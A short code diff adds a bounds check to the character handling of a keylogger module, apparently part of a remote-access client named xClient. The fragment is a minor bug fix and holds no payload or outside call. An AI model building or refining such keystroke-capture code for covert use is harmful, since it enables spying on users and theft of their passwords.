@@ -108,7 +108,8 @@ namespace xClient.Core.Keylogger.WinApi
 
                 // Two or more (only two of them is relevant)
                 default:
-                    chars = new[] { pwszBuff[0], pwszBuff[1] };
+                    if (pwszBuff.Length > 1) chars = new[] { pwszBuff[0], pwszBuff[1] };
+                    else chars = null;
                     break;
             }
 
